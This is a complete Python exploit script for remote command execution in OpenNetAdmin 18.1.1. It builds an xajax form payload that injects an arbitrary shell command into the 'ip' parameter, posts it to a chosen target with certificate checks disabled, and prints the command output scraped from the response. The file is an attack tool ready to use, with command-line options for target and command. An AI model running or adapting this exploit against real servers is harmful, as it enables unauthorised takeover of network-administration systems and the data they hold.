#!/usr/bin/env python3

try:
    import requests
    import argparse
    import sys
    import time
    import urllib3
    from bs4 import BeautifulSoup as Soup
    from termcolor import colored
except ImportError as i:
    print("[" + colored('0x0', 'red') + f"] {i}")
    sys.exit(1)

urllib3.disable_warnings() # Disable SSL warning
def ascii_art():
    ascii = '''
8"""88                  8"""8            8""""8                       
8    8 eeeee eeee eeeee 8   8 eeee eeeee 8    8 eeeee eeeeeee e  eeeee
8    8 8   8 8    8   8 8e  8 8      8   8eeee8 8   8 8  8  8 8  8   8
8    8 8eee8 8eee 8e  8 88  8 8eee   8e  88   8 8e  8 8e 8  8 8e 8e  8
8    8 88    88   88  8 88  8 88     88  88   8 88  8 88 8  8 88 88  8
8eeee8 88    88ee 88  8 88  8 88ee   88  88   8 88ee8 88 8  8 88 88  8
ver. 18.1.1                                                     @Kr0ff
    '''
    print(ascii)

def exploit(HOST, CMD):

    payload = f'xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;{CMD};echo&xajaxargs[]=ping'

    headers = {
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "*/*",
        "Content-Length": str(len(payload)),
        "Content-Type": "application/x-www-form-urlencoded"
    }
    print("[" + colored("+", "green") + "] Sending payload to target...")
    
    r = requests.post(f"{HOST}", data=payload, headers=headers, verify=False)
    time.sleep(0.5)
    if '<pre style="padding: 4px;font-family: monospace;">' in r.text:
        print("[" + colored("+", "green") + "] Payload sent successfully")
        time.sleep(0.5)
    else:
        print("[" + colored("!", "yellow") + "] Couldn't send payload. Something is wrong...")
        sys.exit(0)
    
    soup = Soup(r.text , 'lxml') # Get in XML format
    extract_pre = soup.find_all('pre')[0] # output only <pre> tag
    
    print("[" + colored("+", "green") + "] Printing output...")
    time.sleep(0.1)
    print("=" * 32)
    print("\n"+extract_pre.text)
    print("=" * 32)

#Initilize parser for arguments
def parse_argz():   
    parser = argparse.ArgumentParser(description='OpenNetAdmin 18.1.1 RCE')
    parser.add_argument("-t", "--target", help="Target to send payload to. Example: http/s:[IP/HOSTNAME][:PORT]/ona/", type=str, required=True)
    parser.add_argument("-c", "--cmd", help="Port to connect to", type=str, required=True)
    #args = parser.parse_args(args=None if sys.argv[1:] else ['--help']) #Show help menu if no arguments provided
    args = parser.parse_args(args=None)

    if not args.target or not args.cmd:
        parser.error(colored("[WARNING]","yellow"), "Not all arguments provided")
        sys.exit(1)
    else:
        TARGET = str(args.target)
        CMD = str(args.cmd)
        exploit(TARGET, CMD)

if __name__ == "__main__":
    try:
        ascii_art()
        parse_argz()
    except Exception as e:
        print("[" + colored("0x1","red") + f"] {e}")
        sys.exit(1)
        